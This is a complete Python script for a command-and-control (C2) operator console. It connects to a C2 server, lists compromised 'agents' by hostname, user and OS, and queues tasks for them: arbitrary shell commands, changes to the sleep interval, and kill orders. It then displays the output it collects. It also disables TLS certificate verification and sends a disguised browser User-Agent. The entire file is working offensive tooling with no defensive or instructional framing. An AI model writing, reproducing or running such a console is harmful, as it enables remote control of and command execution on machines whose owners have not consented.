#!/usr/bin/env python3
import sys
import json
import urllib.request
import urllib.error
import ssl

SERVER = "http://127.0.0.1:8443"

def _get_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx

def _try_open(req):
    try:
        ctx = _get_ctx()
        return urllib.request.urlopen(req, context=ctx, timeout=10)
    except urllib.error.URLError:
        try:
            return urllib.request.urlopen(req, timeout=10)
        except Exception:
            return None
    except Exception:
        return None

def http(url):
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    resp = _try_open(req)
    if resp:
        return json.loads(resp.read().decode())
    return None

def http_post(url, data):
    body = json.dumps(data).encode()
    req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
    try:
        ctx = _get_ctx()
        resp = urllib.request.urlopen(req, context=ctx, timeout=10)
        return json.loads(resp.read().decode())
    except Exception as e:
        print(f"[!] {e}")
        return None

def cmd_agents():
    r = http(f"{SERVER}/api/agents")
    if not r:
        return
    agents = r.get("agents", [])
    if not agents:
        print("[ ] no agents connected")
        return
    print(f"[+] {len(agents)} agent(s):")
    for a in agents:
        print(f"  {a['id']}  {a['hostname']}:{a['user']}  [{a['os']}]  last: {a['last_seen'][:19]}")

def cmd_task(aid, task_type, payload):
    r = http_post(f"{SERVER}/api/task", {
        "agent_id": aid,
        "type": task_type,
        "payload": payload
    })
    if r:
        print(f"[+] task {r.get('task_id')} queued for {aid}")
    else:
        print(f"[!] failed to queue task")

def cmd_results(aid):
    r = http(f"{SERVER}/api/results/{aid}")
    if not r:
        return
    results = r.get("results", [])
    if not results:
        print("[ ] no results")
        return
    for res in results:
        tid = res.get("task_id", 0)
        out = res.get("output", {})
        print(f"[task {tid}]")
        if "stdout" in out:
            if out["stdout"].strip():
                print(out["stdout"].rstrip())
            if out["stderr"].strip():
                print(f"[stderr] {out['stderr'].rstrip()}")
            print(f"[exit code: {out.get('code', '?')}]")
        else:
            print(json.dumps(res, indent=2))
        print()

def cmd_help():
    print("""
commands:
  agents                  list connected agents
  task <aid> shell <cmd>  run shell command on agent
  task <aid> sleep <sec>  set agent sleep interval
  task <aid> exit         kill agent
  results <aid>           show agent task results
  help                    this help
  exit                    quit
""")

def main():
    global SERVER
    i = 1
    while i < len(sys.argv):
        a = sys.argv[i]
        if a == "--server" and i + 1 < len(sys.argv):
            SERVER = sys.argv[i + 1]; i += 2
        else:
            i += 1

    sys.stdout.reconfigure(line_buffering=True)
    print("[C2 operator console]")
    print("type 'help' for commands")
    while True:
        try:
            line = input("c2> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            continue
        parts = line.split()
        cmd = parts[0]
        if cmd == "exit":
            break
        elif cmd == "help":
            cmd_help()
        elif cmd == "agents":
            cmd_agents()
        elif cmd == "task" and len(parts) >= 4:
            aid = parts[1]
            ttype = parts[2]
            payload = " ".join(parts[3:])
            cmd_task(aid, ttype, payload)
        elif cmd == "task" and len(parts) >= 3 and parts[2] == "exit":
            cmd_task(parts[1], "exit", "")
        elif cmd == "results" and len(parts) >= 2:
            cmd_results(parts[1])
        else:
            print("[!] unknown command")

if __name__ == "__main__":
    main()
